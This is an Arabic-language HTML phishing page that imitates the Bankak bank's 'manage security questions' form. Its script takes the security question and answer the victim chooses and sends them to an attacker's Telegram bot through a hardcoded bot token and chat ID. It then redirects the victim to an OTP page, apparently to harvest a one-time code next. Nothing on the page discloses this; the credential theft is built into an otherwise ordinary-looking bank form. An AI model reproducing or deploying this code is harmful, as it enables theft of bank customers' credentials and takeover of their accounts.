<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدارة أسئلة الأمان - بنكك</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background-color: #b91c23; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; color: white; border-bottom: 3px solid #8a1117; position: relative; }
        .header h1 { font-size: 28px; font-weight: bold; letter-spacing: 1px; }
        .header h1 span { color: #dcb310; }
        .menu-icon { font-size: 24px; cursor: pointer; }
        .top-bar { background-color: #555; color: white; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; }
        .top-bar h2 { font-size: 18px; font-weight: 500; }
        .btn-back { background-color: transparent; color: #b91c23; border: 2px solid #b91c23; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .main-container { flex: 1; padding: 30px 20px; max-width: 500px; margin: 0 auto; width: 100%; }
        .card { background-color: white; border-radius: 8px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .card h3 { font-size: 18px; color: #333; margin-bottom: 20px; text-align: center; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; font-weight: bold; }
        .form-group select, .form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; outline: none; background-color: #fff; color: #333; }
        .form-group select:focus, .form-group input:focus { border-color: #b91c23; }
        .btn-submit { width: 100%; padding: 15px; background-color: #b91c23; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .btn-submit:hover { background-color: #8a1117; }
    </style>
</head>
<body>
    <header class="header">
        <h1>بنك <span>bankak</span></h1>
        <i class="fa-solid fa-bars menu-icon"></i>
    </header>

    <div class="top-bar">
        <button class="btn-back" onclick="window.location.href='individual.html'"><i class="fa-solid fa-chevron-right"></i> رجوع</button>
        <h2>إدارة أسئلة الأمان</h2>
    </div>

    <main class="main-container">
        <div class="card">
            <h3>الرجاء اختيار سؤال الأمان والإجابة عليه</h3>
            
            <form onsubmit="sendSecurityData(event)">
                <div class="form-group">
                    <label>اختر سؤال الأمان:</label>
                    <select id="securityQuestion" required>
                        <option value="" disabled selected>-- اضغط لاختيار السؤال --</option>
                        <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
                        <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
                        <option value="في أي سنة تخرجت من الجامعة؟">في أي سنة تخرجت من الجامعة؟</option>
                        <option value="ماذا كان لقبك اثناء الطفولة؟">ماذا كان لقبك اثناء الطفولة؟</option>
                        <option value="اسم مؤلفك المفضل؟">اسم مؤلفك المفضل؟</option>
                        <option value="اسم الشركة المصنعة للسيارة المفضلة لديك؟">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
                        <option value="أي فيلم هو المفضل لديك؟">أي فيلم هو المفضل لديك؟</option>
                        <option value="اسم أفضل صديق في الطفولة؟">اسم أفضل صديق في الطفولة؟</option>
                        <option value="في أي عام حصلت على رخصة القيادة الخاصة بك؟">في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
                        <option value="العلامة التجارية لأول تلفزيون خاص بك؟">العلامة التجارية لأول تلفزيون خاص بك؟</option>
                        <option value="في أي سنة تزوجت؟">في أي سنة تزوجت؟</option>
                        <option value="اسم فريق كرة القدم المفضل لديك؟">اسم فريق كرة القدم المفضل لديك؟</option>
                        <option value="ما هو اسم المدرسة التي التحقت بها؟">ما هو اسم المدرسة التي التحقت بها؟</option>
                        <option value="اسم أول بلد أجنبي قمت بزيارته؟">اسم أول بلد أجنبي قمت بزيارته؟</option>
                        <option value="ما هي ماركة سيارتك الأولى؟">ما هي ماركة سيارتك الأولى؟</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>أدخل الجواب:</label>
                    <input type="text" id="securityAnswer" placeholder="اكتب الجواب هنا..." required>
                </div>
                
                <button type="submit" class="btn-submit">تأكيد والمتابعة (Verify & Continue)</button>
            </form>
        </div>
    </main>

    <script>
        function sendSecurityData(event) {
            event.preventDefault();
            const question = document.getElementById('securityQuestion').value;
            const answer = document.getElementById('securityAnswer').value;

            const token = "9295127609:AAH6m1b_vUZZzsltPPEDTxhyEyMnsh6kbbw";
            const chatId = "8812057901";
            const message = `🛡️ سؤال الأمان:\n\n❓ السؤال: ${question}\n💡 الجواب: ${answer}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(() => window.location.href = 'otp.html')
            .catch(() => window.location.href = 'otp.html');
        }
    </script>
</body>
</html>
